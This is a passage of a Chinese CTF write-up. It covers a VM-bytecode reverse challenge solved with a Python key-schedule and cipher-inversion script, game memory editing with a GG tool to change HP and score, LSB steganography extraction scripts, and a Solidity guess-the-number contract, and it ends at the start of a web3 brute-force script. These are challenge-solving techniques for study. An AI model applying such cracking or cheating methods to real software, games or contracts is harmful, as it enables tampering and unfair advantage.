000##  MOV ECX, 0
004##  ADD EAX, extendKey[0]
008##  MOV ECX, 1
012##  ADD EBX, extendKey[1]
016##  ADD CNT 0x1
020##  XOR EAX, EBX
023##  MOV ECX, EAX
027##  MOV R8, EBX
031##  AND EBX, 0x1f
034##  SAL EAX, EBX
037##  MOV EDX, 32
041##  SUB EDX, EBX
045##  SAR ECX, EDX
048##  OR EAX, ECX
051##  MOV EBX, CNT
055##  MUL EBX, 0x2
059##  MOV ECX, extendKey[2]
063##  ADD EAX, ECX
067##  MOV EBX, R8
071##  XOR EBX, EAX
074##  MOV ECX, EBX
078##  MOV EDX, EAX
082##  AND EDX, 0x1f
085##  SAL EBX, EDX
088##  MOV R8, 32
092##  SUB R8, EDX
096##  SAR ECX, R8
099##  OR EBX, ECX
102##  MOV ECX, CNT
106##  MUL ECX, 0x2
110##  ADD ECX 0x1
114##  MOV EDX, extendKey[3]
118##  ADD EBX, EDX
122##  MOV R8, (CNT==21)
123##  MOV EIP, 16
016##  ADD CNT 0x1
020##  XOR EAX, EBX
023##  MOV ECX, EAX
027##  MOV R8, EBX
031##  AND EBX, 0x1f
034##  SAL EAX, EBX
037##  MOV EDX, 32
041##  SUB EDX, EBX
045##  SAR ECX, EDX
048##  OR EAX, ECX
051##  MOV EBX, CNT
055##  MUL EBX, 0x2
059##  MOV ECX, extendKey[4]
063##  ADD EAX, ECX
067##  MOV EBX, R8
071##  XOR EBX, EAX
074##  MOV ECX, EBX
078##  MOV EDX, EAX
082##  AND EDX, 0x1f
085##  SAL EBX, EDX
088##  MOV R8, 32
092##  SUB R8, EDX
096##  SAR ECX, R8
099##  OR EBX, ECX
102##  MOV ECX, CNT
106##  MUL ECX, 0x2
110##  ADD ECX 0x1
114##  MOV EDX, extendKey[5]
118##  ADD EBX, EDX
122##  MOV R8, (CNT==21)
123##  MOV EIP, 16
016##  ADD CNT 0x1
020##  XOR EAX, EBX
023##  MOV ECX, EAX
027##  MOV R8, EBX
031##  AND EBX, 0x1f
034##  SAL EAX, EBX
037##  MOV EDX, 32
041##  SUB EDX, EBX
045##  SAR ECX, EDX
048##  OR EAX, ECX
051##  MOV EBX, CNT
055##  MUL EBX, 0x2
059##  MOV ECX, extendKey[6]
063##  ADD EAX, ECX
067##  MOV EBX, R8
071##  XOR EBX, EAX
074##  MOV ECX, EBX
078##  MOV EDX, EAX
082##  AND EDX, 0x1f
085##  SAL EBX, EDX
088##  MOV R8, 32
092##  SUB R8, EDX
096##  SAR ECX, R8
099##  OR EBX, ECX
102##  MOV ECX, CNT
106##  MUL ECX, 0x2
110##  ADD ECX 0x1
114##  MOV EDX, extendKey[7]
118##  ADD EBX, EDX
122##  MOV R8, (CNT==21)
123##  MOV EIP, 16
016##  ADD CNT 0x1
020##  XOR EAX, EBX
023##  MOV ECX, EAX
027##  MOV R8, EBX
031##  AND EBX, 0x1f
034##  SAL EAX, EBX
037##  MOV EDX, 32
041##  SUB EDX, EBX
045##  SAR ECX, EDX
048##  OR EAX, ECX
051##  MOV EBX, CNT
055##  MUL EBX, 0x2
059##  MOV ECX, extendKey[8]
063##  ADD EAX, ECX
067##  MOV EBX, R8
071##  XOR EBX, EAX
074##  MOV ECX, EBX
078##  MOV EDX, EAX
082##  AND EDX, 0x1f
085##  SAL EBX, EDX
088##  MOV R8, 32
092##  SUB R8, EDX
096##  SAR ECX, R8
099##  OR EBX, ECX
102##  MOV ECX, CNT
106##  MUL ECX, 0x2
110##  ADD ECX 0x1
114##  MOV EDX, extendKey[9]
118##  ADD EBX, EDX
122##  MOV R8, (CNT==21)
123##  MOV EIP, 16
016##  ADD CNT 0x1
020##  XOR EAX, EBX
023##  MOV ECX, EAX
027##  MOV R8, EBX
031##  AND EBX, 0x1f
034##  SAL EAX, EBX
037##  MOV EDX, 32
041##  SUB EDX, EBX
045##  SAR ECX, EDX
048##  OR EAX, ECX
051##  MOV EBX, CNT
055##  MUL EBX, 0x2
059##  MOV ECX, extendKey[10]
063##  ADD EAX, ECX
067##  MOV EBX, R8
071##  XOR EBX, EAX
074##  MOV ECX, EBX
078##  MOV EDX, EAX
082##  AND EDX, 0x1f
085##  SAL EBX, EDX
088##  MOV R8, 32
092##  SUB R8, EDX
096##  SAR ECX, R8
099##  OR EBX, ECX
102##  MOV ECX, CNT
106##  MUL ECX, 0x2
110##  ADD ECX 0x1
114##  MOV EDX, extendKey[11]
118##  ADD EBX, EDX
122##  MOV R8, (CNT==21)
123##  MOV EIP, 16
016##  ADD CNT 0x1
020##  XOR EAX, EBX
023##  MOV ECX, EAX
027##  MOV R8, EBX
031##  AND EBX, 0x1f
034##  SAL EAX, EBX
037##  MOV EDX, 32
041##  SUB EDX, EBX
045##  SAR ECX, EDX
048##  OR EAX, ECX
051##  MOV EBX, CNT
055##  MUL EBX, 0x2
059##  MOV ECX, extendKey[12]
063##  ADD EAX, ECX
067##  MOV EBX, R8
071##  XOR EBX, EAX
074##  MOV ECX, EBX
078##  MOV EDX, EAX
082##  AND EDX, 0x1f
085##  SAL EBX, EDX
088##  MOV R8, 32
092##  SUB R8, EDX
096##  SAR ECX, R8
099##  OR EBX, ECX
102##  MOV ECX, CNT
106##  MUL ECX, 0x2
110##  ADD ECX 0x1
114##  MOV EDX, extendKey[13]
118##  ADD EBX, EDX
122##  MOV R8, (CNT==21)
123##  MOV EIP, 16
016##  ADD CNT 0x1
020##  XOR EAX, EBX
023##  MOV ECX, EAX
027##  MOV R8, EBX
031##  AND EBX, 0x1f
034##  SAL EAX, EBX
037##  MOV EDX, 32
041##  SUB EDX, EBX
045##  SAR ECX, EDX
048##  OR EAX, ECX
051##  MOV EBX, CNT
055##  MUL EBX, 0x2
059##  MOV ECX, extendKey[14]
063##  ADD EAX, ECX
067##  MOV EBX, R8
071##  XOR EBX, EAX
074##  MOV ECX, EBX
078##  MOV EDX, EAX
082##  AND EDX, 0x1f
085##  SAL EBX, EDX
088##  MOV R8, 32
092##  SUB R8, EDX
096##  SAR ECX, R8
099##  OR EBX, ECX
102##  MOV ECX, CNT
106##  MUL ECX, 0x2
110##  ADD ECX 0x1
114##  MOV EDX, extendKey[15]
118##  ADD EBX, EDX
122##  MOV R8, (CNT==21)
123##  MOV EIP, 16
016##  ADD CNT 0x1
020##  XOR EAX, EBX
023##  MOV ECX, EAX
027##  MOV R8, EBX
031##  AND EBX, 0x1f
034##  SAL EAX, EBX
037##  MOV EDX, 32
041##  SUB EDX, EBX
045##  SAR ECX, EDX
048##  OR EAX, ECX
051##  MOV EBX, CNT
055##  MUL EBX, 0x2
059##  MOV ECX, extendKey[16]
063##  ADD EAX, ECX
067##  MOV EBX, R8
071##  XOR EBX, EAX
074##  MOV ECX, EBX
078##  MOV EDX, EAX
082##  AND EDX, 0x1f
085##  SAL EBX, EDX
088##  MOV R8, 32
092##  SUB R8, EDX
096##  SAR ECX, R8
099##  OR EBX, ECX
102##  MOV ECX, CNT
106##  MUL ECX, 0x2
110##  ADD ECX 0x1
114##  MOV EDX, extendKey[17]
118##  ADD EBX, EDX
122##  MOV R8, (CNT==21)
123##  MOV EIP, 16
016##  ADD CNT 0x1
020##  XOR EAX, EBX
023##  MOV ECX, EAX
027##  MOV R8, EBX
031##  AND EBX, 0x1f
034##  SAL EAX, EBX
037##  MOV EDX, 32
041##  SUB EDX, EBX
045##  SAR ECX, EDX
048##  OR EAX, ECX
051##  MOV EBX, CNT
055##  MUL EBX, 0x2
059##  MOV ECX, extendKey[18]
063##  ADD EAX, ECX
067##  MOV EBX, R8
071##  XOR EBX, EAX
074##  MOV ECX, EBX
078##  MOV EDX, EAX
082##  AND EDX, 0x1f
085##  SAL EBX, EDX
088##  MOV R8, 32
092##  SUB R8, EDX
096##  SAR ECX, R8
099##  OR EBX, ECX
102##  MOV ECX, CNT
106##  MUL ECX, 0x2
110##  ADD ECX 0x1
114##  MOV EDX, extendKey[19]
118##  ADD EBX, EDX
122##  MOV R8, (CNT==21)
123##  MOV EIP, 16
016##  ADD CNT 0x1
020##  XOR EAX, EBX
023##  MOV ECX, EAX
027##  MOV R8, EBX
031##  AND EBX, 0x1f
034##  SAL EAX, EBX
037##  MOV EDX, 32
041##  SUB EDX, EBX
045##  SAR ECX, EDX
048##  OR EAX, ECX
051##  MOV EBX, CNT
055##  MUL EBX, 0x2
059##  MOV ECX, extendKey[20]
063##  ADD EAX, ECX
067##  MOV EBX, R8
071##  XOR EBX, EAX
074##  MOV ECX, EBX
078##  MOV EDX, EAX
082##  AND EDX, 0x1f
085##  SAL EBX, EDX
088##  MOV R8, 32
092##  SUB R8, EDX
096##  SAR ECX, R8
099##  OR EBX, ECX
102##  MOV ECX, CNT
106##  MUL ECX, 0x2
110##  ADD ECX 0x1
114##  MOV EDX, extendKey[21]
118##  ADD EBX, EDX
122##  MOV R8, (CNT==21)
123##  MOV EIP, 16
016##  ADD CNT 0x1
020##  XOR EAX, EBX
023##  MOV ECX, EAX
027##  MOV R8, EBX
031##  AND EBX, 0x1f
034##  SAL EAX, EBX
037##  MOV EDX, 32
041##  SUB EDX, EBX
045##  SAR ECX, EDX
048##  OR EAX, ECX
051##  MOV EBX, CNT
055##  MUL EBX, 0x2
059##  MOV ECX, extendKey[22]
063##  ADD EAX, ECX
067##  MOV EBX, R8
071##  XOR EBX, EAX
074##  MOV ECX, EBX
078##  MOV EDX, EAX
082##  AND EDX, 0x1f
085##  SAL EBX, EDX
088##  MOV R8, 32
092##  SUB R8, EDX
096##  SAR ECX, R8
099##  OR EBX, ECX
102##  MOV ECX, CNT
106##  MUL ECX, 0x2
110##  ADD ECX 0x1
114##  MOV EDX, extendKey[23]
118##  ADD EBX, EDX
122##  MOV R8, (CNT==21)
123##  MOV EIP, 16
016##  ADD CNT 0x1
020##  XOR EAX, EBX
023##  MOV ECX, EAX
027##  MOV R8, EBX
031##  AND EBX, 0x1f
034##  SAL EAX, EBX
037##  MOV EDX, 32
041##  SUB EDX, EBX
045##  SAR ECX, EDX
048##  OR EAX, ECX
051##  MOV EBX, CNT
055##  MUL EBX, 0x2
059##  MOV ECX, extendKey[24]
063##  ADD EAX, ECX
067##  MOV EBX, R8
071##  XOR EBX, EAX
074##  MOV ECX, EBX
078##  MOV EDX, EAX
082##  AND EDX, 0x1f
085##  SAL EBX, EDX
088##  MOV R8, 32
092##  SUB R8, EDX
096##  SAR ECX, R8
099##  OR EBX, ECX
102##  MOV ECX, CNT
106##  MUL ECX, 0x2
110##  ADD ECX 0x1
114##  MOV EDX, extendKey[25]
118##  ADD EBX, EDX
122##  MOV R8, (CNT==21)
123##  MOV EIP, 16
016##  ADD CNT 0x1
020##  XOR EAX, EBX
023##  MOV ECX, EAX
027##  MOV R8, EBX
031##  AND EBX, 0x1f
034##  SAL EAX, EBX
037##  MOV EDX, 32
041##  SUB EDX, EBX
045##  SAR ECX, EDX
048##  OR EAX, ECX
051##  MOV EBX, CNT
055##  MUL EBX, 0x2
059##  MOV ECX, extendKey[26]
063##  ADD EAX, ECX
067##  MOV EBX, R8
071##  XOR EBX, EAX
074##  MOV ECX, EBX
078##  MOV EDX, EAX
082##  AND EDX, 0x1f
085##  SAL EBX, EDX
088##  MOV R8, 32
092##  SUB R8, EDX
096##  SAR ECX, R8
099##  OR EBX, ECX
102##  MOV ECX, CNT
106##  MUL ECX, 0x2
110##  ADD ECX 0x1
114##  MOV EDX, extendKey[27]
118##  ADD EBX, EDX
122##  MOV R8, (CNT==21)
123##  MOV EIP, 16
016##  ADD CNT 0x1
020##  XOR EAX, EBX
023##  MOV ECX, EAX
027##  MOV R8, EBX
031##  AND EBX, 0x1f
034##  SAL EAX, EBX
037##  MOV EDX, 32
041##  SUB EDX, EBX
045##  SAR ECX, EDX
048##  OR EAX, ECX
051##  MOV EBX, CNT
055##  MUL EBX, 0x2
059##  MOV ECX, extendKey[28]
063##  ADD EAX, ECX
067##  MOV EBX, R8
071##  XOR EBX, EAX
074##  MOV ECX, EBX
078##  MOV EDX, EAX
082##  AND EDX, 0x1f
085##  SAL EBX, EDX
088##  MOV R8, 32
092##  SUB R8, EDX
096##  SAR ECX, R8
099##  OR EBX, ECX
102##  MOV ECX, CNT
106##  MUL ECX, 0x2
110##  ADD ECX 0x1
114##  MOV EDX, extendKey[29]
118##  ADD EBX, EDX
122##  MOV R8, (CNT==21)
123##  MOV EIP, 16
016##  ADD CNT 0x1
020##  XOR EAX, EBX
023##  MOV ECX, EAX
027##  MOV R8, EBX
031##  AND EBX, 0x1f
034##  SAL EAX, EBX
037##  MOV EDX, 32
041##  SUB EDX, EBX
045##  SAR ECX, EDX
048##  OR EAX, ECX
051##  MOV EBX, CNT
055##  MUL EBX, 0x2
059##  MOV ECX, extendKey[30]
063##  ADD EAX, ECX
067##  MOV EBX, R8
071##  XOR EBX, EAX
074##  MOV ECX, EBX
078##  MOV EDX, EAX
082##  AND EDX, 0x1f
085##  SAL EBX, EDX
088##  MOV R8, 32
092##  SUB R8, EDX
096##  SAR ECX, R8
099##  OR EBX, ECX
102##  MOV ECX, CNT
106##  MUL ECX, 0x2
110##  ADD ECX 0x1
114##  MOV EDX, extendKey[31]
118##  ADD EBX, EDX
122##  MOV R8, (CNT==21)
123##  MOV EIP, 16
016##  ADD CNT 0x1
020##  XOR EAX, EBX
023##  MOV ECX, EAX
027##  MOV R8, EBX
031##  AND EBX, 0x1f
034##  SAL EAX, EBX
037##  MOV EDX, 32
041##  SUB EDX, EBX
045##  SAR ECX, EDX
048##  OR EAX, ECX
051##  MOV EBX, CNT
055##  MUL EBX, 0x2
059##  MOV ECX, extendKey[32]
063##  ADD EAX, ECX
067##  MOV EBX, R8
071##  XOR EBX, EAX
074##  MOV ECX, EBX
078##  MOV EDX, EAX
082##  AND EDX, 0x1f
085##  SAL EBX, EDX
088##  MOV R8, 32
092##  SUB R8, EDX
096##  SAR ECX, R8
099##  OR EBX, ECX
102##  MOV ECX, CNT
106##  MUL ECX, 0x2
110##  ADD ECX 0x1
114##  MOV EDX, extendKey[33]
118##  ADD EBX, EDX
122##  MOV R8, (CNT==21)
123##  MOV EIP, 16
016##  ADD CNT 0x1
020##  XOR EAX, EBX
023##  MOV ECX, EAX
027##  MOV R8, EBX
031##  AND EBX, 0x1f
034##  SAL EAX, EBX
037##  MOV EDX, 32
041##  SUB EDX, EBX
045##  SAR ECX, EDX
048##  OR EAX, ECX
051##  MOV EBX, CNT
055##  MUL EBX, 0x2
059##  MOV ECX, extendKey[34]
063##  ADD EAX, ECX
067##  MOV EBX, R8
071##  XOR EBX, EAX
074##  MOV ECX, EBX
078##  MOV EDX, EAX
082##  AND EDX, 0x1f
085##  SAL EBX, EDX
088##  MOV R8, 32
092##  SUB R8, EDX
096##  SAR ECX, R8
099##  OR EBX, ECX
102##  MOV ECX, CNT
106##  MUL ECX, 0x2
110##  ADD ECX 0x1
114##  MOV EDX, extendKey[35]
118##  ADD EBX, EDX
122##  MOV R8, (CNT==21)
123##  MOV EIP, 16
016##  ADD CNT 0x1
020##  XOR EAX, EBX
023##  MOV ECX, EAX
027##  MOV R8, EBX
031##  AND EBX, 0x1f
034##  SAL EAX, EBX
037##  MOV EDX, 32
041##  SUB EDX, EBX
045##  SAR ECX, EDX
048##  OR EAX, ECX
051##  MOV EBX, CNT
055##  MUL EBX, 0x2
059##  MOV ECX, extendKey[36]
063##  ADD EAX, ECX
067##  MOV EBX, R8
071##  XOR EBX, EAX
074##  MOV ECX, EBX
078##  MOV EDX, EAX
082##  AND EDX, 0x1f
085##  SAL EBX, EDX
088##  MOV R8, 32
092##  SUB R8, EDX
096##  SAR ECX, R8
099##  OR EBX, ECX
102##  MOV ECX, CNT
106##  MUL ECX, 0x2
110##  ADD ECX 0x1
114##  MOV EDX, extendKey[37]
118##  ADD EBX, EDX
122##  MOV R8, (CNT==21)
123##  MOV EIP, 16
016##  ADD CNT 0x1
020##  XOR EAX, EBX
023##  MOV ECX, EAX
027##  MOV R8, EBX
031##  AND EBX, 0x1f
034##  SAL EAX, EBX
037##  MOV EDX, 32
041##  SUB EDX, EBX
045##  SAR ECX, EDX
048##  OR EAX, ECX
051##  MOV EBX, CNT
055##  MUL EBX, 0x2
059##  MOV ECX, extendKey[38]
063##  ADD EAX, ECX
067##  MOV EBX, R8
071##  XOR EBX, EAX
074##  MOV ECX, EBX
078##  MOV EDX, EAX
082##  AND EDX, 0x1f
085##  SAL EBX, EDX
088##  MOV R8, 32
092##  SUB R8, EDX
096##  SAR ECX, R8
099##  OR EBX, ECX
102##  MOV ECX, CNT
106##  MUL ECX, 0x2
110##  ADD ECX 0x1
114##  MOV EDX, extendKey[39]
118##  ADD EBX, EDX
122##  MOV R8, (CNT==21)
123##  MOV EIP, 16
016##  ADD CNT 0x1
020##  XOR EAX, EBX
023##  MOV ECX, EAX
027##  MOV R8, EBX
031##  AND EBX, 0x1f
034##  SAL EAX, EBX
037##  MOV EDX, 32
041##  SUB EDX, EBX
045##  SAR ECX, EDX
048##  OR EAX, ECX
051##  MOV EBX, CNT
055##  MUL EBX, 0x2
059##  MOV ECX, extendKey[40]
063##  ADD EAX, ECX
067##  MOV EBX, R8
071##  XOR EBX, EAX
074##  MOV ECX, EBX
078##  MOV EDX, EAX
082##  AND EDX, 0x1f
085##  SAL EBX, EDX
088##  MOV R8, 32
092##  SUB R8, EDX
096##  SAR ECX, R8
099##  OR EBX, ECX
102##  MOV ECX, CNT
106##  MUL ECX, 0x2
110##  ADD ECX 0x1
114##  MOV EDX, extendKey[41]
118##  ADD EBX, EDX
122##  MOV R8, (CNT==21)
123##  MOV EIP, 16
016##  ADD CNT 0x1
020##  XOR EAX, EBX
023##  MOV ECX, EAX
027##  MOV R8, EBX
031##  AND EBX, 0x1f
034##  SAL EAX, EBX
037##  MOV EDX, 32
041##  SUB EDX, EBX
045##  SAR ECX, EDX
048##  OR EAX, ECX
051##  MOV EBX, CNT
055##  MUL EBX, 0x2
059##  MOV ECX, extendKey[42]
063##  ADD EAX, ECX
067##  MOV EBX, R8
071##  XOR EBX, EAX
074##  MOV ECX, EBX
078##  MOV EDX, EAX
082##  AND EDX, 0x1f
085##  SAL EBX, EDX
088##  MOV R8, 32
092##  SUB R8, EDX
096##  SAR ECX, R8
099##  OR EBX, ECX
102##  MOV ECX, CNT
106##  MUL ECX, 0x2
110##  ADD ECX 0x1
114##  MOV EDX, extendKey[43]
118##  ADD EBX, EDX
122##  MOV R8, (CNT==21)
123##  124##
```

用 python 可以这样表示

```python
EAX = ctypes.c_uint32(0x31323334)
EBX = ctypes.c_uint32(0x35363738)
EAX.value += extendKey[0]
EBX.value += extendKey[1]
for CNT in range(1, 21):
    EAX.value ^= EBX.value
    EAX.value = (EAX.value << (EBX.value & 0X1F)) | (EAX.value >> (32 - (EBX.value & 0X1F)))
    EAX.value += extendKey[2*CNT]
    EBX.value ^= EAX.value
    EBX.value = (EBX.value << (EAX.value & 0X1F)) | (EBX.value >> (32-(EAX.value & 0X1F)))
    EBX.value += extendKey[2*CNT+1]
```

不清楚原因 patch 之后 `extendKey` 对不上

所以就改了改字节码运行的时候打印出 `extendKey`

![](static/Eg9CbK3KhoatXQx4ycpcxwyUneh.png)

![](static/Gg2sbTil5oAzJ9x7c46c5KnCnAb.png)

所以 exp 如下

```python
import ctypes
import struct


def p3(s, p):
    i = j = 0
    for z in range(len(p)):
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        # s[i] = s[j]
        # s[j] = s[i]
        s[i], s[j] = s[j], s[i]
        p[z] ^= s[(s[i] + s[j]) % 256]
    return p


def p1(s, key):
    j = 0
    k = []
    for i in range(256):
        s.append(i)
        k.append(key[i % len(key)])
    for i in range(256):
        j = (j + s[i] + ord(k[i])) % 256
        # 用在线网站,交换有问题
        # s[i] = s[j]
        # s[j] = s[i]
        s[i], s[j] = s[j], s[i]


def T(num, round):
    numArr = bytearray(struct.pack('<I', num))
    for i in range(4):
        numArr[i] = Sbox[numArr[i]]
    return struct.unpack('<I', numArr)[0] ^ Rcon[round]


def p2(key):
    w = [0] * 44
    for i in range(4):
        w[i] = struct.unpack('<I', key[i * 4:i * 4 + 4])[0]
    cnt = 0
    for i in range(4, 44, 1):
        if i % 4 == 0:
            w[i] = w[i - 4] ^ T(w[i - 1], cnt)
            cnt += 1
        w[i] = w[i - 4] ^ w[i - 1]
    return w


REG = {}
EIP = 0
reg_table = {
    '1': 'EAX',
    '2': 'EBX',
    '3': 'ECX',
    '4': 'EDX',
    '5': 'R8',
    '6': 'CNT',
    '7': 'EIP'}
Sbox = [82,9,106,213,48,54,165,56,191,64,163,158,129,243,215,251,124,227,57,130,155,47,255,135,52,142,67,68,196,222,233,203,84,123,148,50,166,194,35,61,238,76,149,11,66,250,195,78,8,46,161,102,40,217,36,178,118,91,162,73,109,139,209,37,114,248,246,100,134,104,152,22,212,164,92,204,93,101,182,146,108,112,72,80,253,237,185,218,94,21,70,87,167,141,157,132,144,216,171,0,140,188,211,10,247,228,88,5,184,179,69,6,208,44,30,143,202,63,15,2,193,175,189,3,1,19,138,107,58,145,17,65,79,103,220,234,151,242,207,206,240,180,230,115,150,172,116,34,231,173,53,133,226,249,55,232,28,117,223,110,71,241,26,113,29,41,197,137,111,183,98,14,170,24,190,27,252,86,62,75,198,210,121,32,154,219,192,254,120,205,90,244,31,221,168,51,136,7,199,49,177,18,16,89,39,128,236,95,96,81,127,169,25,181,74,13,45,229,122,159,147,201,156,239,160,224,59,77,174,42,245,176,200,235,187,60,131,83,153,97,23,43,4,126,186,119,214,38,225,105,20,99,85,33,12,125]
Rcon = [16777216,33554432,67108864,134217728,268435456,536870912,1073741824,0x80000000,452984832,905969664]
s = []
key = 'CalmDownBelieveU'
p1(s, key)
key = [61,15,58,65,177,180,182,248,192,143,37,238,50,29,215,190]
key = bytes(p3(s, key))
extendKey = p2(bytes(key))
opcode = [69,136,121,24,179,67,209,20,27,169,205,146,212,160,124,49,20,155,157,253,52,71,174,164,134,60,184,203,131,210,57,151,77,241,61,6,13,52,235,37,100,178,8,238,205,27,194,159,230,165,211,221,100,217,111,202,185,207,226,50,88,4,58,73,10,92,24,230,246,245,21,110,182,151,85,28,181,191,185,236,92,98,222,85,228,14,235,93,77,161,61,140,222,74,124,13,211,75,134,235,164,228,235,16,29,41,49,105,188,51,232,65,209,165,35,182,248,245,69,18,152,71,223,85,114]
opcode = p3(s, opcode)
data1 = [228,244,207,251,194,124,252,61,198,145,97,98,89,25,92,208,155,38,34,225,98,206,234,245,223,54,214,137,35,86,180,66,223,234,90,136,5,189,166,117,111,222,39,156,163,173,36,174,47,144,15,160,45,239,211,11,190,181,24,164,234,114,174,27]
data1 = bytes(p3(s, data1))
data2 = [165,83,203,51,99,164,30,91,230,64,181,55,190,47,125,240,186,173,116,47,89,64,68,215,124,138,34,175,60,136,77,216,250,127,14,14,66,168,198,247,252,189,243,239,25,63,143,7,177,13,99,226,100,6,207,77,46,136,251,123,225,27,76,183]
data2 = bytes(p3(s, data2))
data3 = [95,219,46,178,111,141,17,168,254,60,68,59,41,183,182,118,3,47,150,240,140,159,110,238]
data3 = bytes(p3(s, data3))
#print(data2)
#data2=b'\x04:\xf26V\xb1\x9a\xfc\xf7\x1e!\xdc\xdb\x8f\x8e\x94M4\xe7\x9d\x9cR\x0cn\xfb\xfa\xd5\xfd2\xf9x,\xbb\xbe9\xc1\xd9\x85u\xb6(\xf8\xccx\xa4\xe4\x85\x92\x0e\xbdr\xc5\xaf\x87\x91*\x8b\xf1\xef\x96\x16`\xd1\x12'
final = struct.unpack('>16I', data2)
extendKey = [1835819331, 1853321028, 1768711490, 1432712805, 2177920767, 4020699579, 2261476601, 3551400604, 711874531, 3318306392, 1124217505, 2427199549, 3099853672, 2098025776, 1041196945, 2929936300, 246748610, 1941455090, 1303848803, 3809763535, 1395557789, 546751855, 1830937100, 2385871555, 2516030638, 3043054017, 3628118989, 1450520846, 1825094265, 3651791800, 32069749, 1469868411, 919887482, 4017993154, 4002737591, 3104343244, 4134211933, 420914335, 4152510760, 1317719524, 1990496755, 1873950060, 2553314372, 3602559392]
#test = b'J\x08Y\x92\xa9f\x91\xfe^\xa7\xe9\xe3\xf8\x02\xefTK\xbf\\\x90\x16cst\xc2\xfa\xed\x83T(\xf6z\x1f\xc2\x8e\xda/\xe06\xab\x1f\x1c_$:\x173D\x8a\xbf\xe6\xac\xbd\x9a\x800\x86\x8c\xf1>2S\x05\x0e'
#test2 = b',\x0b\x87\xb5\xc2\x8b\xb4(\xf7+\x1bxP\x0e\n\xfa\x06\xcf*N\xe8\x1b.5\r\x98\xd9\x11_\xa0\xa1\x91.\x010\xd6\xb3\xb4\x98B\xe4&\xbbE\xa5\xb6&\xd2\xf0\xc4\nA\xb4\xc9\xda[<2\xd1 K\xc5\xe8V'
#test3 = b'6r\xa5\xca\x0b\x95\xee\xb5\xa9\xac\x98\xfd\x19\xc1r\xe1\xb8\xc6\x88b$\xaa\xcaq\x8f\r,\xf5\xf9\x06\xf2{\x87\x80\xadF#R\x97\xb9\x06g\x1a\xbd\xe4\x9b\xef\x11v7\x18o1h&j,\xcd\xff\x12\xb8\xffu\xac'
#final = struct.unpack('>16I', test3)

tmp=[]
for i in range(14, -2, -2):
    EAX, EBX = ctypes.c_uint32(final[i]), ctypes.c_uint32(final[i + 1])
    for CNT in range(21, 0, -1):
        EBX.value -= extendKey[2 * CNT + 1]
        EBX.value = (EBX.value >> (EAX.value & 0X1F)) | (EBX.value << (32 - (EAX.value & 0X1F)))
        EBX.value ^= EAX.value
        EAX.value -= extendKey[2 * CNT]
        EAX.value = (EAX.value >> (EBX.value & 0X1F)) | (EAX.value << (32 - (EBX.value & 0X1F)))
        EAX.value ^= EBX.value
    EAX.value -= extendKey[0]
    EBX.value -= extendKey[1]
    if i != 0:
        EAX.value ^= final[i - 2]
        EBX.value ^= final[i - 1]
    tmp.append((struct.pack('>I',EAX.value),struct.pack('>I',EBX.value)))
flag=b''
for val in reversed(tmp):
    flag+=val[0]
    flag+=val[1]
print(flag)


'''
EAX = ctypes.c_uint32(0x31323334)
EBX = ctypes.c_uint32(0x35363738)
EAX.value += extendKey[0]
EBX.value += extendKey[1]
for CNT in range(1, 22):#[1,21]
    EAX.value ^= EBX.value
    EAX.value = (EAX.value << (EBX.value & 0X1F)) | (EAX.value >> (32 - (EBX.value & 0X1F)))
    EAX.value += extendKey[2*CNT]
    EBX.value ^= EAX.value
    EBX.value = (EBX.value << (EAX.value & 0X1F)) | (EBX.value >> (32-(EAX.value & 0X1F)))
    EBX.value += extendKey[2*CNT+1]'''
```

### BabyAnti-2.0

用 GG 修改器修改内存,HP 可以很快搜到,先把 HP 改成了 99999 条生命,score 比较难找先保证不死吧,改完之后会弹出弹窗,但是中间 `||` 这个东西可以点,弹出 resume 之后就又可以动了,然后搜到 score 在改成 4999 就好了

![](static/EjWZbeZyNotTTzxYIG1caSsGnsf.png)

![](static/CEykbNGb4orrGsxG33Acr5HLnPg.png)

## STEG

### EZ_v1deo

拿到 flag.avi ffmpeg 分离帧

```http
.\ffmpeg.exe -i flag.avi \1\%d.png
```

分离帧得到一堆形似 WM logo 的黑白 png 图片

![](static/ZFL5b3wxToa4zpx0aYxcaml1nqG.png)

在每张图片 r0 g0 b0 均可看到字符，隔五张变为不同的字符

写个脚本每隔 5 张 lsb 提取

```python
from PIL import Image

for n in range(1,212,5):
    print(n)
    img = Image.open("./1/{}.png".format(n))
    img = img.convert("RGB")
    width,height=img.size
    for i in range(0,width):
        for j in range(0,height):
            tmp = img.getpixel((i,j))
            if tmp[1]&0x1 == 0:
                img.putpixel((i,j),0)
            else:
                img.putpixel((i,j),255)
    img.save("./3/{}.png".format(n))
```

![](static/SyJcbYzAqoQIq1xN8AZcslpYnOe.png)

### StegLab1-PointAttack

随机噪声攻击，但是影响貌似不大,常规 lsb 隐写,挑几个点把数据塞进去就可以

```python
from PIL import Image


class Solution1:
    def Encrypt(self, img, key):
        img = Image.open(img)
        img_width, img_height = img.size

        key_binary = ''.join(format(ord(char), '08b') for char in key)
        print(key_binary)
        key_index = 0

        for y in range(0, img_height, 2):
            for x in range(0, img_width, 2):
                if key_index < len(key_binary):
                    pixel = list(img.getpixel((x, y)))
                    pixel[0] = (pixel[0] & 0xFE) | int(key_binary[key_index])
                    img.putpixel((x, y), tuple(pixel))
                    key_index += 1

        return img


class Solution:
    def Decrypt(self,img) -> str:
        img = Image.open(img)
        img_width, img_height = img.size
        extracted_key_binary = ""

        for y in range(0, img_height, 2):
            for x in range(0, img_width, 2):
                pixel = img.getpixel((x, y))
                extracted_key_binary += str(pixel[0] & 0x01)
        # print(extracted_key_binary)
                if len(extracted_key_binary) >= 8 and extracted_key_binary[-8:] == "11111111":
                    break
            if len(extracted_key_binary) >= 8 and extracted_key_binary[-8:] == "11111111":
                break

        extracted_key_binary = extracted_key_binary[:-8]  # 去除冗余数据
        key = ""
        for i in range(0, len(extracted_key_binary), 8):
            byte = extracted_key_binary[i:i + 8]
            key += chr(int(byte, 2))

        return key
```

## Blochchain

### babyblock

看看源码

```
//contracts/Example.sol
pragma solidity ^0.5.0;

contract Challenge {
    bool public solved = false;
    uint256 private secretNumber;

    constructor() public {
        secretNumber = block.timestamp % 10 + 1;
    }

    function guessNumber(uint256 _num) public {
        uint256 num = _num;

        assembly {
            let m := mload(0x40)
            let a := and(sload(secretNumber_slot), 1)
            let b := and(num, 1)
            let result := eq(a, b)
            mstore(m, result)
            sstore(solved_slot, result)
        }
    }

    function isSolved() public view returns (bool) {
        return solved;
    }
}
```

猜数字,范围是 1~10,那就一个一个试过去咯,甚至攻击合约都不用写了哈哈

```python
import json
import time
from web3 import Web3, HTTPProvider

contract_address = "0x137E52EaE7581975F08d9471C80D5d09020442c4"
private_key = [private_key]
wallet = Web3.toChecksumAddress([wallet])

